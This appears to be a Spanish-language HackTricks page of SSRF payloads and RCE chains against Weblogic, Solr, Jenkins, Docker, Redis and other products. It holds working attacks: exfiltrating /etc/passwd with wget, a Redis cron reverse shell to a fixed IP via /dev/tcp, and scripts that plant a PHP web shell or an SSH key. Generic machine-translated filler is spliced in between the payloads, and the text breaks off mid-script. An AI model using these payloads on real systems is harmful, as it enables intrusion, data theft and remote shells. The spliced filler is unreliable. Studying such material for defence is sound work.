# Plataformas Vulnerables a SSRF

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esta secci√≥n fue copiada de [https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**Puerto com√∫nmente utilizado: 9200**

Cuando Elasticsearch se implementa internamente, generalmente no requiere autenticaci√≥n.

Si tienes un SSRF parcialmente ciego donde puedes determinar el c√≥digo de estado, verifica si los siguientes endpoints devuelven un 200:
```http
/_cluster/health
/_cat/indices
/_cat/health
```
Si tienes un SSRF ciego donde puedes enviar solicitudes POST, puedes apagar la instancia de Elasticsearch enviando una solicitud POST a la siguiente ruta:

Nota: la API `_shutdown` ha sido eliminada a partir de la versi√≥n 2.x de Elasticsearch. Esto solo funciona en Elasticsearch 1.6 y versiones anteriores:
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**Puertos com√∫nmente enlazados: 80, 443 (SSL), 7001, 8888**

**Canario SSRF: UDDI Explorer (CVE-2014-4210)**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
Esto tambi√©n funciona a trav√©s de GET:
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
Este endpoint tambi√©n es vulnerable a la inyecci√≥n de CRLF:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
Resultar√° en la siguiente solicitud:
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF Canary: CVE-2020-14883**

Tomado de [aqu√≠](https://forum.90sec.com/t/topic/1412).

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
# Plataformas vulnerables a SSRF (Server-Side Request Forgery)

## Windows:

### IIS (Internet Information Services)

IIS es un servidor web desarrollado por Microsoft para sistemas operativos Windows. Es ampliamente utilizado y puede ser vulnerable a ataques de SSRF si no se configura correctamente.

### .NET Framework

El .NET Framework es un entorno de desarrollo de software desarrollado por Microsoft. Las aplicaciones web basadas en .NET tambi√©n pueden ser vulnerables a ataques de SSRF si no se implementan medidas de seguridad adecuadas.

### SharePoint

SharePoint es una plataforma de colaboraci√≥n desarrollada por Microsoft. Las versiones antiguas de SharePoint pueden ser vulnerables a ataques de SSRF si no se aplican las actualizaciones de seguridad necesarias.

### Exchange Server

Exchange Server es un servidor de correo electr√≥nico desarrollado por Microsoft. Las versiones antiguas de Exchange Server pueden ser vulnerables a ataques de SSRF si no se aplican las actualizaciones de seguridad adecuadas.

### Remote Desktop Protocol (RDP)

El Protocolo de Escritorio Remoto (RDP) es un protocolo desarrollado por Microsoft que permite a los usuarios controlar de forma remota un equipo Windows. Si se explota una vulnerabilidad en el RDP, un atacante puede realizar ataques de SSRF en el sistema objetivo.

### Windows Management Instrumentation (WMI)

WMI es una infraestructura de administraci√≥n de Windows desarrollada por Microsoft. Si se explota una vulnerabilidad en WMI, un atacante puede utilizarla para realizar ataques de SSRF en sistemas Windows.
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**Puertos com√∫nmente utilizados: 8500, 8501 (SSL)**

Puedes encontrar m√°s informaci√≥n [aqu√≠](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html).

## Shellshock

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080**

Para probar eficazmente Shellshock, es posible que necesites agregar un encabezado que contenga la carga √∫til. Vale la pena probar las siguientes rutas CGI:

Lista corta de rutas CGI para probar:

[Gist que contiene las rutas](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRF Canary: Shellshock a trav√©s del Agente de Usuario**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**Puertos com√∫nmente utilizados: 80, 8080, 8888, 8082**

Consulte la referencia de la API de Apache Druid [aqu√≠](https://druid.apache.org/docs/latest/operations/api-reference.html).

Si puede ver el c√≥digo de estado, verifique las siguientes rutas para ver si devuelven un c√≥digo de estado 200:
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
Tareas de apagado, requiere adivinar IDs de tareas o el nombre del origen de datos:
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
Apagar supervisores en Apache Druid Overlords:

```bash
curl -X POST http://localhost:8090/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```

Este comando se utiliza para apagar un supervisor espec√≠fico en Apache Druid Overlords. Debes reemplazar `{supervisorId}` con el ID del supervisor que deseas apagar.
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**Puerto com√∫nmente utilizado: 8983**

**SSRF Canary: Par√°metro Shards**

> Para agregar a lo que shubham est√° diciendo, escanear solr es relativamente f√°cil. Hay un par√°metro shards= que te permite rebotar SSRF a SSRF para verificar si est√°s alcanzando una instancia de solr a ciegas.
>
> ‚Äî –•–∞–≤–∏–∂ –ù–∞—Ñ—Ñ–∏ ü•ï (@nnwakelam) [13 de enero de 2021](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

Tomado de [aqu√≠](https://github.com/veracode-research/solr-injection).
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**RCE a trav√©s de dataImportHandler**

[Investigaci√≥n sobre RCE a trav√©s de dataImportHandler](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**Puertos com√∫nmente utilizados: 80,443 (SSL)**

Tomado de esta investigaci√≥n [aqu√≠](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRF Canary: XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# Plataformas vulnerables a SSRF (Server-Side Request Forgery)

A continuaci√≥n se presenta una lista de plataformas que son conocidas por ser vulnerables a SSRF. Estas plataformas pueden ser utilizadas para practicar t√©cnicas de pentesting y mejorar la comprensi√≥n de c√≥mo funciona SSRF.

## Plataformas de nube/SaaS

- **Workspace**: Una plataforma de colaboraci√≥n en l√≠nea que permite a los usuarios compartir y editar documentos en tiempo real. Es conocida por ser vulnerable a SSRF en ciertos escenarios.
- **AWS (Amazon Web Services)**: Un conjunto de servicios en la nube ofrecidos por Amazon. Algunos de los servicios de AWS han sido identificados como vulnerables a SSRF.
- **GCP (Google Cloud Platform)**: Una plataforma de computaci√≥n en la nube ofrecida por Google. Algunos servicios de GCP tambi√©n han sido identificados como vulnerables a SSRF.
- **Azure**: La plataforma de computaci√≥n en la nube de Microsoft. Al igual que AWS y GCP, algunos servicios de Azure pueden ser vulnerables a SSRF.

## Plataformas de desarrollo web

- **Ruby on Rails**: Un framework de desarrollo web popular que utiliza el lenguaje de programaci√≥n Ruby. Las aplicaciones desarrolladas con Ruby on Rails pueden ser vulnerables a SSRF en ciertos casos.
- **Django**: Un framework de desarrollo web de Python. Al igual que Ruby on Rails, las aplicaciones desarrolladas con Django pueden ser vulnerables a SSRF en ciertos escenarios.
- **Express.js**: Un framework de desarrollo web de Node.js. Las aplicaciones desarrolladas con Express.js tambi√©n pueden ser vulnerables a SSRF en ciertos casos.

## Plataformas de gesti√≥n de contenido

- **WordPress**: Un sistema de gesti√≥n de contenido popular utilizado para crear sitios web y blogs. Las instalaciones de WordPress pueden ser vulnerables a SSRF en ciertos escenarios.
- **Joomla**: Otro sistema de gesti√≥n de contenido ampliamente utilizado. Al igual que WordPress, las instalaciones de Joomla pueden ser vulnerables a SSRF en ciertos casos.
- **Drupal**: Un sistema de gesti√≥n de contenido de c√≥digo abierto. Algunas versiones de Drupal han sido identificadas como vulnerables a SSRF.

Recuerda que estas plataformas son solo ejemplos y que existen muchas otras que tambi√©n pueden ser vulnerables a SSRF. Es importante realizar pruebas de seguridad adecuadas y obtener permiso antes de realizar cualquier actividad de pentesting.
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

Tomado de [aqu√≠](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary: Struts2-016**:

Agrega esto al final de cada punto final/URL interno que conozcas:
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

Tomado de [aqu√≠](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**Canario SSRF: Desplegar WAR desde URL**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary: Sharelinks (versiones de Confluence lanzadas desde noviembre de 2016 y anteriores)**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Ticket de seguridad de Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary: iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Ticket de seguridad de Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Ticket de seguridad de Atlassian JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## Otros productos de Atlassian

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8443 (SSL)**

**SSRF Canary: iconUriServlet (CVE-2017-9506)**:

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Ticket de seguridad de Atlassian OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**Puerto com√∫nmente utilizado: 4242**

[OpenTSDB Ejecuci√≥n Remota de C√≥digo](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF Canary: curl a trav√©s de RCE**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 Ejecuci√≥n Remota de C√≥digo](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF Canary: curl a trav√©s de RCE - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080, 8888**

Excelente art√≠culo [aqu√≠](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

**SSRF Canary: CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

Sigue las instrucciones aqu√≠ para lograr RCE a trav√©s de GET: [Hacking Jenkins Parte 2 - Abusando de la Meta Programaci√≥n para RCE sin autenticaci√≥n](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**RCE a trav√©s de Groovy**

La ejecuci√≥n remota de c√≥digo (RCE) a trav√©s de Groovy es una t√©cnica com√∫nmente utilizada en ataques de servidor-side request forgery (SSRF). Groovy es un lenguaje de programaci√≥n din√°mico que se ejecuta en la m√°quina virtual de Java (JVM) y se utiliza principalmente para la automatizaci√≥n de tareas en aplicaciones Java.

En un escenario de SSRF, un atacante puede aprovechar una vulnerabilidad en una aplicaci√≥n web para enviar solicitudes HTTP desde el servidor hacia otros recursos internos o externos. Si la aplicaci√≥n utiliza Groovy para evaluar o ejecutar el contenido de una URL proporcionada por el atacante, esto puede conducir a una RCE.

El atacante puede construir una URL maliciosa que contenga c√≥digo Groovy y enviarla a la aplicaci√≥n vulnerable. Cuando la aplicaci√≥n intente evaluar o ejecutar el contenido de la URL, el c√≥digo Groovy se ejecutar√° en el contexto del servidor, lo que permite al atacante ejecutar comandos arbitrarios.

Para prevenir este tipo de ataque, es importante validar y filtrar adecuadamente las URL proporcionadas por los usuarios antes de evaluar o ejecutar su contenido. Adem√°s, se recomienda deshabilitar o restringir el acceso a recursos internos sensibles desde el servidor, limitando as√≠ las posibles rutas de ataque.

Es fundamental que los desarrolladores y administradores de sistemas est√©n al tanto de esta vulnerabilidad y tomen las medidas necesarias para proteger sus aplicaciones y servidores contra ataques de RCE a trav√©s de Groovy.
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Panel de control de Hystrix

**Puertos com√∫nmente utilizados: 80, 443 (SSL), 8080**

Spring Cloud Netflix, versiones 2.2.x anteriores a 2.2.4, versiones 2.1.x anteriores a 2.1.6.

**Canario SSRF: CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**Puertos com√∫nmente utilizados: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary: CVE-2019-6715**

Esto debe ser una solicitud PUT:
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF Canary**

El aviso para esta vulnerabilidad fue publicado aqu√≠: [Vulnerabilidad SSRF en W3 Total Cache](https://klikki.fi/adv/w3\_total\_cache.html)

Este c√≥digo PHP generar√° un payload para tu host de SSRF Canary (reemplaza `url` con tu host de canary):
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**Puertos com√∫nmente utilizados: 2375, 2376 (SSL)**

Si tienes un SSRF parcialmente ciego, puedes utilizar las siguientes rutas para verificar la presencia de la API de Docker:
```bash
/containers/json
/secrets
/services
```
**RCE a trav√©s de la ejecuci√≥n de una imagen de Docker arbitraria**

En algunos casos, los servidores vulnerables a SSRF pueden permitir la ejecuci√≥n de im√°genes de Docker arbitrarias. Esto puede conducir a una vulnerabilidad de ejecuci√≥n remota de c√≥digo (RCE) si se explota correctamente.

Para aprovechar esta vulnerabilidad, primero debemos encontrar una forma de enviar una solicitud SSRF al servidor objetivo. Una vez que hayamos logrado esto, podemos intentar ejecutar una imagen de Docker arbitraria utilizando la funcionalidad de Docker del servidor.

Aqu√≠ hay algunos puntos a tener en cuenta al intentar explotar esta vulnerabilidad:

1. **Conexi√≥n a Docker**: Para ejecutar una imagen de Docker en el servidor, necesitaremos establecer una conexi√≥n con el demonio de Docker en el servidor. Esto se puede hacer utilizando la biblioteca Docker Engine API o herramientas como `docker-py` en Python.

2. **Imagen de Docker maliciosa**: Necesitaremos crear una imagen de Docker maliciosa que contenga el c√≥digo que queremos ejecutar en el servidor objetivo. Esto puede incluir scripts maliciosos, herramientas de hacking o cualquier otro c√≥digo que deseemos ejecutar.

3. **Construcci√≥n y carga de la imagen**: Una vez que tengamos la imagen de Docker maliciosa, debemos construirla y cargarla en el servidor objetivo. Esto se puede hacer utilizando comandos de Docker como `docker build` y `docker load`.

4. **Ejecuci√≥n de la imagen**: Una vez que la imagen de Docker maliciosa est√© en el servidor, podemos ejecutarla utilizando comandos de Docker como `docker run`. Esto ejecutar√° el c√≥digo malicioso contenido en la imagen y nos dar√° acceso remoto al servidor objetivo.

Es importante tener en cuenta que esta t√©cnica solo funcionar√° en servidores que permitan la ejecuci√≥n de im√°genes de Docker arbitrarias. Adem√°s, es crucial asegurarse de que la imagen de Docker maliciosa no contenga ning√∫n c√≥digo da√±ino que pueda afectar negativamente al servidor o a otros sistemas.

En resumen, la ejecuci√≥n de una imagen de Docker arbitraria a trav√©s de una vulnerabilidad de SSRF puede permitirnos lograr una vulnerabilidad de ejecuci√≥n remota de c√≥digo (RCE) en el servidor objetivo. Sin embargo, es importante tener cuidado al utilizar esta t√©cnica y asegurarse de que se realiza de manera √©tica y responsable.
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
Reemplace "alpine" con una imagen arbitraria que desee que el contenedor de Docker ejecute.

## Gitlab Prometheus Redis Exporter

**Puertos com√∫nmente vinculados: 9121**

Esta vulnerabilidad afecta a las instancias de Gitlab anteriores a la versi√≥n 13.1.1. Seg√∫n la [documentaci√≥n de Gitlab](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus), "Prometheus y sus exportadores est√°n activados de forma predeterminada a partir de GitLab 9.0".

Estos exportadores proporcionan un excelente m√©todo para que un atacante pivotee y ataque otros servicios utilizando CVE-2020-13379. Uno de los exportadores que se puede explotar f√°cilmente es el Exportador de Redis.

El siguiente punto final permitir√° a un atacante volcar todas las claves en el servidor de Redis proporcionado a trav√©s del par√°metro objetivo:
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
***

**Posible a trav√©s de Gopher**

## Redis

**Puerto com√∫nmente utilizado: 6379**

Lectura recomendada:

* [Intentando hackear Redis a trav√©s de solicitudes HTTP](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [Exploits SSRF contra Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**RCE a trav√©s de Cron** - [Superficies de Ataque Gopher](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:

Gopher es un protocolo de red que permite a los clientes obtener y mostrar documentos de servidores remotos. Es similar a HTTP, pero m√°s simple y menos utilizado en la actualidad. Sin embargo, algunos servidores a√∫n admiten el protocolo Gopher y pueden ser vulnerables a ataques de SSRF.

Para explotar una vulnerabilidad de SSRF en un servidor Gopher, el atacante puede enviar una solicitud maliciosa que incluya una URL de destino dentro de la solicitud Gopher. El servidor Gopher procesar√° la solicitud y realizar√° una solicitud a la URL de destino en nombre del atacante. Esto puede permitir al atacante acceder a recursos internos o realizar ataques a otros sistemas en la red.

Es importante tener en cuenta que no todos los servidores Gopher son vulnerables a SSRF. Sin embargo, si se encuentra un servidor que admite el protocolo Gopher y permite solicitudes a URLs externas, es posible que exista una vulnerabilidad de SSRF que pueda ser explotada.
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**RCE a trav√©s de la carga de shell (PHP)** - [Resumen de la obtenci√≥n de shell en Redis](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**RCE a trav√©s de authorized\_keys** - [Resumen de la obtenci√≥n de shell en Redis](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
